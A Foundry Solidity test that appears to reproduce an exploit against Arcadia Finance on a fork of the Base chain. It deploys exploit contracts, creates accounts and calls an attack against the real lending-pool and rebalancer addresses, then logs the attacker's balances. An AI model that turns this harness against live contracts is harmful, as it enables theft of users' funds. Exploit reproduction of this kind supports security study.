// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";
import {Exploit1} from "./Exploit1.sol";
import {ExploitHook} from "./ExploitHook.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Exploit_ArcadiaFinance is TestHarness, TokenBalanceTracker {
    IERC20 internal constant USDC =
        IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);

    IWETH9 internal constant WETH =
        IWETH9(0x4200000000000000000000000000000000000006);

    IERC20 internal constant cbBTC =
        IERC20(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf);

    IERC20 internal constant USDS =
        IERC20(0x820C137fa70C8691f0e44Dc420a5e53c168921Dc);

    IERC20 internal constant AERO =
        IERC20(0x940181a94A35A4569E4529A3CDfB74e38FD98631);

    function setUp() external {
        cheat.createSelectFork("base", 32881440);

        addTokenToTracker(address(WETH));
        addTokenToTracker(address(USDC));
        addTokenToTracker(address(cbBTC));
        addTokenToTracker(address(USDS));
        addTokenToTracker(address(AERO));

        updateBalanceTracker(address(this));
    }

    function test_attack() external {

        // 1. Deploy the exploit hook contract
        ExploitHook exploitHook = new ExploitHook();

        // 2. Deploy the exploit contract 1
        Exploit1 exploit1 = new Exploit1();
        
        updateBalanceTracker(address(exploit1));

        console.log("===== Initial Balances =====");
        logBalancesWithLabel("Attacker", address(this));
        logBalancesWithLabel("Attacker Contract", address(exploit1));


        // 3. Create accounts
        exploit1.createAccounts(15, 0xDa14Fdd72345c4d2511357214c5B89A919768e59);

        // 4. Execute the attack
        exploit1.attack(
            Exploit1.Data(
                0x9529E5988ceD568898566782e88012cf11C3Ec99, // targetContract
                0xC729213B9b72694F202FeB9cf40FE8ba5F5A4509, // rebalancerSpot
                0xC729213B9b72694F202FeB9cf40FE8ba5F5A4509, // rebalancerSpot2
                0x827922686190790b37229fd06084350E74485b72, // NFTPositionManagerAERO_CL_POS
                0x3ec4a293Fb906DD2Cd440c20dECB250DeF141dF1, // arcadiaLendingPoolUSDC
                0xa37E9b4369dc20940009030BfbC2088F09645e3B, // arcadiaLendingPoolcbBTC
                0x803ea69c7e87D1d6C86adeB40CB636cC0E6B98E2, // arcadiaLendingPoolWETH
                address(exploitHook), // attackerContract
                0x1Dc7A0f5336F52724B650E39174cfcbbEdD67bF1, // arcadiaStakedSlipstreamAM
                0x4200000000000000000000000000000000000006, // weth
                150000000000000000000 // number
            )
        );

        console.log("===== Final Balances =====");
        logBalancesWithLabel("Attacker", address(this));
        logBalancesWithLabel("Attacker Contract", address(exploit1));
    }
}
